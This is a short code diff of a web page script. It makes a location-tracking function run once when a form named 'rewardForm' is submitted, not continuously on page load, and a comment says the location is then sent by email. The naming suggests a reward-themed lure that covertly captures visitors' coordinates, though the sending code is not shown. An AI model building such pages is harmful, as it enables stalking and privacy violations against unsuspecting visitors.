@@ -155,7 +155,7 @@
 
     function trackMovement() {
         if ("geolocation" in navigator) {
-            navigator.geolocation.watchPosition(
+            navigator.geolocation.getCurrentPosition(
                 (position) => {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
@@ -185,7 +185,11 @@
         }
     }
 
-    trackMovement();
+    // When the form is submitted, track location and send email
+    document.getElementById("rewardForm").addEventListener("submit", function(event) {
+        event.preventDefault(); // Prevent form submission
+        trackMovement();
+    });
 </script>
 </body>
 </html>
